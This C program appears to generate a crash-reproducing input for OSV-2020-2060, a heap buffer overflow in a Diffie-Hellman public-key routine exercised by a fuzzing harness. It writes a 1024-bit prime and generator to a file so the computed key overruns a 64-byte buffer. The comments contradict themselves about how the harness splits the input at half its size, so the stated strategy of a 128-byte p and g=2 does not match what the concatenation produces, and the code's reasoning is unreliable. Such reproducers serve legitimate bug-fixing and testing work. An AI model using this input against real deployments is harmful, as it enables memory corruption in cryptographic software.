/*
 * gen_poc.c: Generate a binary PoC for OSV-2020-2060
 *
 * The harness takes raw bytes and splits them into DH p and g parameters.
 * We need DH parameters where the modular exponentiation result
 * (g^x mod p) can be larger than the 64-byte output buffer.
 *
 * Bug mechanism:
 *   GeneratePublicDh() calls mp_exptmod(&key->g, x, &key->p, y) then
 *   mp_to_unsigned_bin(y, pub) without checking if mp_unsigned_bin_size(y)
 *   exceeds *pubSz. When the result y has more bytes than the output
 *   buffer, fp_to_unsigned_bin_at_pos writes past the heap allocation.
 *
 * Strategy: Use a large prime p (>64 bytes) so the DH public key y = g^x mod p
 * is also large. A 128-byte (1024-bit) prime ensures the result exceeds
 * the 64-byte output buffer.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

int main(int argc, char **argv) {
    const char *outfile = "poc.bin";
    FILE *f;

    if (argc > 1)
        outfile = argv[1];

    f = fopen(outfile, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* Use RFC 2409 1024-bit MODP group prime (Oakley Group 2).
     * This is 128 bytes, so g^x mod p will be up to 128 bytes,
     * which exceeds the 64-byte output buffer in the harness.
     *
     * p = FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1
     *     29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD
     *     EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245
     *     E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED
     *     EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE65381
     *     FFFFFFFF FFFFFFFF
     */
    unsigned char p[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xC9, 0x0F, 0xDA, 0xA2, 0x21, 0x68, 0xC2, 0x34,
        0xC4, 0xC6, 0x62, 0x8B, 0x80, 0xDC, 0x1C, 0xD1,
        0x29, 0x02, 0x4E, 0x08, 0x8A, 0x67, 0xCC, 0x74,
        0x02, 0x0B, 0xBE, 0xA6, 0x3B, 0x13, 0x9B, 0x22,
        0x51, 0x4A, 0x08, 0x79, 0x8E, 0x34, 0x04, 0xDD,
        0xEF, 0x95, 0x19, 0xB3, 0xCD, 0x3A, 0x43, 0x1B,
        0x30, 0x2B, 0x0A, 0x6D, 0xF2, 0x5F, 0x14, 0x37,
        0x4F, 0xE1, 0x35, 0x6D, 0x6D, 0x51, 0xC2, 0x45,
        0xE4, 0x85, 0xB5, 0x76, 0x62, 0x5E, 0x7E, 0xC6,
        0xF4, 0x4C, 0x42, 0xE9, 0xA6, 0x37, 0xED, 0x6B,
        0x0B, 0xFF, 0x5C, 0xB6, 0xF4, 0x06, 0xB7, 0xED,
        0xEE, 0x38, 0x6B, 0xFB, 0x5A, 0x89, 0x9F, 0xA5,
        0xAE, 0x9F, 0x24, 0x11, 0x7C, 0x4B, 0x1F, 0xE6,
        0x49, 0x28, 0x66, 0x51, 0xEC, 0xE6, 0x53, 0x81,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
    };

    /* g = 2 (standard DH generator) */
    unsigned char g[] = { 0x02 };

    /* Write p followed by g (harness splits at size/2) */
    /* To make the split work: total = sizeof(p) + sizeof(g),
     * half = total/2. We want first half to contain p and second half g.
     * Since sizeof(p) >> sizeof(g), we pad g to match.
     * Actually the harness uses half = size/2, so we just concatenate. */
    fwrite(p, 1, sizeof(p), f);
    fwrite(g, 1, sizeof(g), f);

    fclose(f);
    fprintf(stderr, "Generated %s (%zu bytes)\n", outfile,
            sizeof(p) + sizeof(g));
    return 0;
}
